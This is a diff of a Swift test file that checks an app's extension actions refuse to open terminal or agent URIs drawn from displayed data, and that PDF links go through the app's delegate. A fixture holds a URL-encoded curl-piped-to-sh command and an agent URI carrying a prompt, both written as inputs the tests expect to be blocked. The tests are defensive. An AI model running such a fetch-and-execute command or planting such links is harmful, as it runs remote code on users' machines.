@@ -58,10 +58,11 @@ import PDFKit
 @MainActor
 @Test func anOpenActionCantRunWhatItsDataSays() {
     let item: JSONValue = .obj(["link": "terminal://x?cmd=curl%20example.com%7Csh", "agent": "agent://claude?prompt=go", "url": "https://example.com/i/1"])
-    #expect(ExtActions.openURI("${link}", item: item) == nil)
-    #expect(ExtActions.openURI("${agent}", item: item) == nil)
-    #expect(ExtActions.openURI("${url}", item: item) == "https://example.com/i/1")
-    #expect(ExtActions.openURI("terminal://run?cmd=make", item: item) != nil)   // the extension's own words
+    let actions = ExtActions(AppModel())
+    #expect(actions.openURI("${link}", item: item) == nil)
+    #expect(actions.openURI("${agent}", item: item) == nil)
+    #expect(actions.openURI("${url}", item: item) == "https://example.com/i/1")
+    #expect(actions.openURI("terminal://run?cmd=make", item: item) != nil)   // the extension's own words
 }
 
 /// A PDF's links go by the same rules: its view has Kelp's delegate (without one, PDFKit opens any link with its app).
@@ -71,8 +72,8 @@ import PDFKit
     defer { try? FileManager.default.removeItem(at: url) }
     let doc = PDFDocument(); doc.insert(PDFPage(), at: 0)
     #expect(doc.write(to: url))
-    let view = try #require(Preview.view(for: url) as? PDFView)
-    #expect(view.delegate === PDFLinks.shared)
+    let view = try #require(Preview.view(for: url, app: AppModel()) as? LinkedPDFView)
+    #expect(view.delegate === view.links)
 }
 
 /// What an extension's page opens may be data it shows: kelp.open opens pages and files, not commands or agents.
